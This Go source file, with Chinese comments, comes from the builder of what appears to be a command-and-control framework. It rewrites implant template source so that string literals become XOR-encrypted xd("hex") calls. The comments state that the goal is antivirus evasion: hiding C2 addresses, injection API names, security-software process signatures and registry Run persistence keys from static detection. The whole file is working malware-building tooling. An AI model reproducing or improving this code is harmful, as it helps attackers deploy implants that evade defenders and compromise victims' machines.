package builder

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// 植入端模板编译期字符串混淆（免杀）：
//
// 将模板源码中的简单双引号字符串字面量（C2 地址、注入 API 名、协议前缀、
// 配置块标识、安全软件进程特征等）加密为 xd("hex") 运行时解码形式，
// 使编译产物二进制中不再保留这些敏感字符串的明文，降低静态特征检出。
//
// 模板内 obfuscate.go 提供 xd() 解码函数；本文件在 processTemplates 渲染之后、
// compileGoCode 编译之前对所有模板 .go 文件执行混淆。

// xorObfuscateKey 与服务端/模板端共用的线性密钥流，取低 8 位。xdBase 为每构建随机基准。
func xorObfuscateKey(i int, xdBase byte) byte {
	return byte(int(xdBase) + i*0x23)
}

// obfuscateString 将明文字符串加密为 hex 形式的 XOR 密文。
func obfuscateString(s string, xdBase byte) string {
	var b strings.Builder
	b.Grow(len(s) * 2)
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, "%02x", s[i]^xorObfuscateKey(i, xdBase))
	}
	return b.String()
}

// obfuscateImplantSource 对单个模板源文件做字符串混淆。
// 仅处理"简单"双引号字符串（不含转义、长度 >= 4），自动跳过：
//   - 行注释 // 与块注释 /* */
//   - import 声明内的字符串（含 import ( 多行）
//   - 已加密的 xd("...") 调用参数（防止二次加密）
//   - 反引号原始字符串
func obfuscateImplantSource(src []byte, xdBase byte) []byte {
	var out bytes.Buffer
	out.Grow(len(src) + len(src)/8)

	const (
		stCode = iota
		stLineComment
		stBlockComment
	)
	state := stCode
	lineStart := true
	i := 0

	isSpace := func(c byte) bool {
		return c == ' ' || c == '\t' || c == '\r'
	}

	for i < len(src) {
		c := src[i]
		switch state {
		case stCode:
			switch {
			case c == '/' && i+1 < len(src) && src[i+1] == '/':
				state = stLineComment
				out.WriteByte(c)
				out.WriteByte(src[i+1])
				i += 2
			case c == '/' && i+1 < len(src) && src[i+1] == '*':
				state = stBlockComment
				out.WriteByte(c)
				out.WriteByte(src[i+1])
				i += 2
			case c == '\n':
				lineStart = true
				out.WriteByte(c)
				i++
			case isSpace(c):
				out.WriteByte(c)
				i++
			case lineStart && c == 'i' && i+6 <= len(src) && string(src[i:i+6]) == "import":
				// import 声明：跳过其内部所有字符串（包路径不可混淆）
				out.WriteString("import")
				i += 6
				// 跳过空白
				for i < len(src) && isSpace(src[i]) {
					out.WriteByte(src[i])
					i++
				}
				if i < len(src) && src[i] == '(' {
					// import ( 多行形式：原样复制到配对 )
					depth := 0
					for i < len(src) {
						out.WriteByte(src[i])
						if src[i] == '(' {
							depth++
						} else if src[i] == ')' {
							depth--
							if depth == 0 {
								i++
								lineStart = false
								break
							}
						}
						if src[i] == '\n' {
							lineStart = true
						} else if !isSpace(src[i]) {
							lineStart = false
						}
						i++
					}
				} else {
					// 单行 import：原样复制到行尾
					for i < len(src) && src[i] != '\n' {
						out.WriteByte(src[i])
						i++
					}
					lineStart = true
				}
			case c == '`':
				// 反引号原始字符串：
				//   - **struct tag 必须原样保留**（`json:"name"` 改了 encoding/json 就废了）；
				//   - 其它原始字符串（注册表键、设备路径、命名管道、多行脚本）**现在是混淆对象**：
				//     raw string 的"字面内容"就是运行期真实值，因此可以直接对内容做 XOR+hex，
				//     xd() 按字节还原，不存在转义二次解释的问题。
				// 旧实现把整类反引号字符串一律跳过，理由是"struct tag 不能改"——但代价是
				// 把注册表键/设备路径这类高信号串一起放行了（实测默认载荷里
				// `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 是明文）。
				j := i + 1
				for j < len(src) && src[j] != '`' {
					j++
				}
				if j >= len(src) {
					j = len(src) - 1
				}
				content := string(src[i+1 : j])
				if rawStringObfuscatable(content, src, i) {
					out.WriteString(`xd("` + obfuscateString(content, xdBase) + `")`)
				} else {
					out.Write(src[i : j+1])
				}
				i = j + 1
				lineStart = false
			case c == '\'':
				// rune 字面量（如 'a'、'"'、'\n'）：原样复制到闭合单引号
				j := i + 1
				for j < len(src) {
					if src[j] == '\\' {
						j += 2
						continue
					}
					if src[j] == '\'' {
						j++
						break
					}
					j++
				}
				if j > len(src) {
					j = len(src)
				}
				out.Write(src[i:j])
				i = j
				lineStart = false
			case c == '"':
				// 先扫描到闭合引号，判断是否"简单"字符串
				j := i + 1
				simple := true
				for j < len(src) && src[j] != '"' {
					if src[j] == '\\' {
						simple = false
						// 转义字符占用两个字符，跳过其后的转义对象（如 \" 中的引号不是闭合符）
						j += 2
						continue
					}
					j++
				}
				if j >= len(src) {
					// 未闭合：原样输出当前字符
					out.WriteByte(c)
					lineStart = false
					i++
					continue
				}
				str := string(src[i+1 : j])
				// 跳过已加密的 xd("...") 参数
				insideXd := i >= 3 && src[i-3] == 'x' && src[i-2] == 'd' && src[i-1] == '('
				if insideXd || len(str) < 4 {
					out.Write(src[i : j+1])
					i = j + 1
					lineStart = false
					continue
				}
				// 带转义的字面量（v1.4.0 S3 补的盲区）：Windows 路径/设备名/注册表键
				// 在 Go 源码里几乎都写作 `"\\\\.\\kgameprotect"` 这种**含转义**的形式，
				// 旧实现一律跳过 —— 于是"最该藏起来"的那批字符串反而最稳地留在明文里
				// （实测默认载荷里 SOFTWARE\Microsoft\...\Run 等键名可直接 strings 到）。
				// 这里用 strconv.Unquote 求出**运行期真实值**，再对值做 XOR+hex，
				// xd() 是纯字节解码，因此含 \r\n、NUL、非 UTF-8 字节都能原样还原。
				value := str
				if !simple {
					unq, uerr := strconv.Unquote(string(src[i : j+1]))
					if uerr != nil {
						out.Write(src[i : j+1])
						i = j + 1
						lineStart = false
						continue
					}
					value = unq
					if len(value) < 4 {
						out.Write(src[i : j+1])
						i = j + 1
						lineStart = false
						continue
					}
				}
				out.WriteString(`xd("` + obfuscateString(value, xdBase) + `")`)
				i = j + 1
				lineStart = false
			default:
				out.WriteByte(c)
				if c != '\n' {
					lineStart = false
				}
				i++
			}
		case stLineComment:
			out.WriteByte(c)
			if c == '\n' {
				state = stCode
				lineStart = true
			}
			i++
		case stBlockComment:
			out.WriteByte(c)
			if c == '*' && i+1 < len(src) && src[i+1] == '/' {
				out.WriteByte(src[i+1])
				i += 2
				state = stCode
				lineStart = false
				continue
			}
			i++
		}
	}
	return out.Bytes()
}

// rawStringObfuscatable 判断一个反引号原始字符串是否可以被安全地改写为 xd("...")。
//
// 保守放行，两类必须原样保留：
//  1. **struct tag**：形如 `json:"a" xml:"b"` 的 key:"value" 序列 —— 改了就会让
//     encoding/json、encoding/xml 之类的反射解析失效（这是旧实现"整类跳过"的正当理由）；
//  2. 太短（<4 字节，与双引号路径同口径）或含 CR/NUL 之外的控制字符（避免把日志/协议模板
//     改得难以阅读——xd 能还原，但没必要）。
//
// 其余（Windows 路径、注册表键、设备路径、命名管道、多行脚本）都是高信号明文，应当混淆。
func rawStringObfuscatable(content string, src []byte, at int) bool {
	if len(content) < 4 {
		return false
	}
	if structTagLike(content) {
		return false
	}
	// 同一行里出现 const：常量声明要求编译期常量，xd() 是函数调用 → 会把源码改坏。
	// （双引号路径今天没有这个问题，因为模板里没有 ≥4 字符的 const 字符串；这里显式挡一层。）
	if lineHasConst(src, at) {
		return false
	}
	return true
}

// structTagLike 是否是反射用的 struct tag（`key:"value" key2:"value2"` 形式）。
func structTagLike(content string) bool {
	i := 0
	groups := 0
	for i < len(content) {
		// key
		start := i
		for i < len(content) && (isTagKeyByte(content[i])) {
			i++
		}
		if i == start || i >= len(content) || content[i] != ':' {
			return false
		}
		i++ // ':'
		if i >= len(content) || content[i] != '"' {
			return false
		}
		i++ // 开引号
		for i < len(content) && content[i] != '"' {
			if content[i] == '\\' {
				return false // tag 里出现转义：少见，保守当作非 tag（继续按普通原始串处理）？
			}
			i++
		}
		if i >= len(content) {
			return false
		}
		i++ // 闭引号
		groups++
		if i < len(content) {
			if content[i] != ' ' {
				return false
			}
			for i < len(content) && content[i] == ' ' {
				i++
			}
		}
	}
	return groups > 0
}

func isTagKeyByte(c byte) bool {
	return c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == '_'
}

// lineHasConst 判断 at 所在行（从行首到 at）里是否出现 const 关键字。
func lineHasConst(src []byte, at int) bool {
	lineStart := at
	for lineStart > 0 && src[lineStart-1] != '\n' {
		lineStart--
	}
	return strings.Contains(string(src[lineStart:at]), "const")
}

// obfuscateImplantSources 对 tmpDir 下所有模板 .go 文件执行字符串混淆。
// obfuscate.go 为解码层自身，跳过（其 xd() 参数已是密文，不可二次加密）。
func (b *Builder) obfuscateImplantSources(tmpDir string, xdBase byte) error {
	entries, err := os.ReadDir(tmpDir)
	if err != nil {
		return err
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") {
			continue
		}
		if e.Name() == "obfuscate.go" {
			continue
		}
		p := filepath.Join(tmpDir, e.Name())
		src, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		obf := obfuscateImplantSource(src, xdBase)
		if !bytes.Equal(obf, src) {
			if err := os.WriteFile(p, obf, 0644); err != nil {
				return err
			}
		}
	}
	return nil
}
